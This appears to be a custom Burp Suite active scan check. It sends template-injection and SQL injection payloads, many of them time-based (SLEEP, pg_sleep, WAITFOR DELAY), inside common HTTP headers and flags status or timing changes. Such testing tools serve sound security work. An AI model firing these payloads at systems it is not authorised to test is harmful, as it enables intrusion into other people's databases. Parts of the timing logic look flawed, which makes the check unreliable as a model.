@@ -1,0 +1,212 @@
+id: d0fa1ce2-153e-4ef4-9d24-df37edb17b8e
+name: Possible header used in backend
+function: SCAN_CHECK_ACTIVE_PER_REQUEST
+location: SCANNER
+source: |
+  /**
+   * Identifies server-side template injection.
+   * @author PortSwigger
+   **/
+
+  var headers = new String[]{
+     	 "True-Client-IP",
+      "Client-IP",
+      "Contact",
+      "Forwarded",
+      "From",
+      "Origin",
+      "Referer",
+      "X-Client-IP",
+      "X-Custom-IP-Authorization",
+      "X-Forward-For",
+      "X-Forwarded-For",
+      "X-Forwarded-Server",
+      "X-HTTP-Host-Override",
+      "X-Original-URL",
+      "X-Originating-IP",
+      "X-Real-IP",
+      "X-Remote-Addr",
+      "X-Remote-IP",
+      "X-Rewrite-URL",
+      "X-Wap-Profile"
+  };
+
+  var fuzzs = new String[]{
+      // SSTI payloads
+      "{{ aaaa }}",
+      "${aaaa}",
+      "<%=aaaa%>",
+      "#{aaaa}",
+      "${{aaaa}}",
+      "${{aaaa}}",
+      "${{T(aaaa7)}}",
+      // SQL payloads
+      "' OR '1'='1",
+      "\" OR \"1\"=\"1",
+      "asda then 1/0 ; -- asd",
+      
+  };
+
+  var timebasedSQLFuzzs = new String[]{
+          "AND (SELECT * FROM (SELECT(SLEEP(THRESHOLD)))nQIP) -- a",
+      "' AND (SELECT * FROM (SELECT(SLEEP(THRESHOLD)))nQIP) -- a",
+      "\" AND (SELECT * FROM (SELECT(SLEEP(THRESHOLD)))nQIP) -- a",
+      "sleep(THRESHOLD) -- a",
+      "1 or sleep(THRESHOLD) -- a",
+      "\" or sleep(THRESHOLD) -- a",
+      "' or sleep(THRESHOLD) -- a",
+      "\" or sleep(THRESHOLD)=\"",
+      "' or sleep(THRESHOLD)='",
+      "1) or sleep(THRESHOLD) -- a",
+      "\") or sleep(THRESHOLD)=\"",
+      "') or sleep(THRESHOLD)='",
+      "1)) or sleep(THRESHOLD) -- a",
+      "\")) or sleep(THRESHOLD)=\"",
+      "')) or sleep(THRESHOLD)='",
+      ";waitfor delay '0:0:THRESHOLD' -- a",
+      ");waitfor delay '0:0:THRESHOLD' -- a",
+      "';waitfor delay '0:0:THRESHOLD' -- a",
+      "\";waitfor delay '0:0:THRESHOLD' -- a",
+      "');waitfor delay '0:0:THRESHOLD' -- a",
+      "\");waitfor delay '0:0:THRESHOLD' -- a",
+      "));waitfor delay '0:0:THRESHOLD' -- a",
+      "'));waitfor delay '0:0:THRESHOLD' -- a",
+      "\"));waitfor delay '0:0:THRESHOLD' -- a",
+      "pg_sleep(THRESHOLD) -- a",
+      "1 or pg_sleep(THRESHOLD) -- a",
+      "\" or pg_sleep(THRESHOLD) -- a",
+      "' or pg_sleep(THRESHOLD) -- a",
+      "1) or pg_sleep(THRESHOLD) -- a",
+      "\") or pg_sleep(THRESHOLD) -- a",
+      "') or pg_sleep(THRESHOLD) -- a",
+      "1)) or pg_sleep(THRESHOLD) -- a",
+      "\")) or pg_sleep(THRESHOLD) -- a",
+      "')) or pg_sleep(THRESHOLD) -- a",
+      "SLEEP(THRESHOLD) -- a",
+      "SLEEP(THRESHOLD) -- a",
+      "SLEEP(THRESHOLD)=\"",
+      "SLEEP(THRESHOLD)='",
+      "or SLEEP(THRESHOLD)",
+      "or SLEEP(THRESHOLD) -- a",
+      "or SLEEP(THRESHOLD) -- a",
+      "or SLEEP(THRESHOLD)=\"",
+      "or SLEEP(THRESHOLD)='",
+      "waitfor delay '00:00:0THRESHOLD'",
+      "waitfor delay '00:00:0THRESHOLD' -- a",
+      "waitfor delay '00:00:0THRESHOLD' -- a",
+      "benchmark(THRESHOLD0000000,MDTHRESHOLD(1))",
+      "benchmark(THRESHOLD0000000,MDTHRESHOLD(1)) -- a",
+      "benchmark(THRESHOLD0000000,MDTHRESHOLD(1)) -- a",
+      "or benchmark(THRESHOLD0000000,MDTHRESHOLD(1))",
+      "or benchmark(THRESHOLD0000000,MDTHRESHOLD(1)) -- a",
+      "or benchmark(THRESHOLD0000000,MDTHRESHOLD(1)) -- a",
+      "pg_SLEEP(THRESHOLD)",
+      "pg_SLEEP(THRESHOLD) -- a",
+      "pg_SLEEP(THRESHOLD) -- a",
+      "or pg_SLEEP(THRESHOLD)",
+      "or pg_SLEEP(THRESHOLD) -- a",
+      "or pg_SLEEP(THRESHOLD) -- a",
+      "AnD SLEEP(THRESHOLD)",
+      "AnD SLEEP(THRESHOLD) -- a",
+      "AnD SLEEP(THRESHOLD) -- a",
+      "&&SLEEP(THRESHOLD)",
+      "&&SLEEP(THRESHOLD) -- a",
+      "&&SLEEP(THRESHOLD) -- a",
+      "' AnD SLEEP(THRESHOLD) ANd '1",
+      "'&&SLEEP(THRESHOLD)&&'1",
+      "ORDER BY SLEEP(THRESHOLD)",
+      "ORDER BY SLEEP(THRESHOLD) -- a",
+      "ORDER BY SLEEP(THRESHOLD) -- a",
+      "(SELECT * FROM (SELECT(SLEEP(THRESHOLD)))ecMj)",
+      "(SELECT * FROM (SELECT(SLEEP(THRESHOLD)))ecMj) -- a",
+      "(SELECT * FROM (SELECT(SLEEP(THRESHOLD)))ecMj) -- a",
+      "RANDOMBLOB(THRESHOLD00000000/2)",
+      "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(THRESHOLD00000000/2))))",
+      "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(THRESHOLD00000000/2))))"
+  };
+
+  List<AuditIssue> auditIssues = new ArrayList<>();
+
+  for (var header : headers) {
+      for (var fuzz : fuzzs) {
+          var newRequest = requestResponse.request();
+          var newHeader = HttpHeader.httpHeader(header, fuzz);
+
+          if(newRequest.hasHeader(header)) {
+              newHeader = HttpHeader.httpHeader(header, newRequest.headerValue(header) + fuzz);
+              newRequest = newRequest.withUpdatedHeader(newHeader);
+          } else {
+              newRequest = newRequest.withAddedHeader(newHeader);
+          }
+
+          var rr = http.sendRequest(newRequest);
+
+          if (rr.hasResponse() && rr.response().statusCode() != requestResponse.response().statusCode()) {
+              auditIssues.add(AuditIssue.auditIssue(
+                                  "Possible header used in backend",
+                                  "Header: <code>" + newHeader.toString() + "</code>",
+                                  "Please try exploit that header",
+                                  rr.request().url(),
+                                  AuditIssueSeverity.INFORMATION,
+                                  AuditIssueConfidence.TENTATIVE,
+                                  "",
+                                  "",
+                                  AuditIssueSeverity.INFORMATION,
+                                  rr
+                          ));
+          }
+      }
+
+      for (var fuzz : timebasedSQLFuzzs) {
+          var newRequest = requestResponse.request();
+          var newHeader = HttpHeader.httpHeader(header, fuzz.replace("THRESHOLD", "5"));
+          
+          var newRequest10 = requestResponse.request();
+          var newHeader10 = HttpHeader.httpHeader(header, fuzz.replace("THRESHOLD", "10"));
+
+          if(newRequest.hasHeader(header)) {
+              newHeader = HttpHeader.httpHeader(header, newRequest.headerValue(header) + fuzz.replace("THRESHOLD", "5"));
+              newRequest = newRequest.withUpdatedHeader(newHeader);
+              
+              newHeader10 = HttpHeader.httpHeader(header, newRequest10.headerValue(header) + fuzz.replace("THRESHOLD", "10"));
+              newRequest10 = newRequest.withUpdatedHeader(newHeader10);
+          } else {
+              newRequest = newRequest.withAddedHeader(newHeader);
+              newRequest10 = newRequest.withUpdatedHeader(newHeader10);
+          }
+
+         	var rr5 = http.sendRequest(newRequest);
+         	var rr10 = http.sendRequest(newRequest10);
+         
+         var time_rr5 = rr5.timingData().get().timeBetweenRequestSentAndEndOfResponse().toMillis();
+      	var time_rr10 = rr10.timingData().get().timeBetweenRequestSentAndEndOfResponse().toMillis();
+          
+         logging().logToOutput(time_rr5 + " - " + time_rr10);
+          
+          
+         	int difference2 = Math.abs((int)time_rr10 - (int)time_rr5 - 5000);
+          
+        	if (difference2 <= 1000){
+              auditIssues.add(AuditIssue.auditIssue(
+                                  "Possible Time-based SQLi in header",
+                                  fuzz.replace("THRESHOLD", "5") + " - " + time_rr5 + "\r" + fuzz.replace("THRESHOLD", "10") + " - " + time_rr10 + "</code>",
+                                  "Please try exploit that header",
+                                  rr5.request().url(),
+                                  AuditIssueSeverity.INFORMATION,
+                                  AuditIssueConfidence.TENTATIVE,
+                                  "",
+                                  "",
+                                  AuditIssueSeverity.INFORMATION,
+                                  rr5
+                          ));
+          }
+      }
+
+  }
+
+  if (auditIssues.size() == 0) {
+      return AuditResult.auditResult();
+  }
+
+  AuditIssue[] array = auditIssues.toArray(new AuditIssue[0]);
+  return AuditResult.auditResult(array);
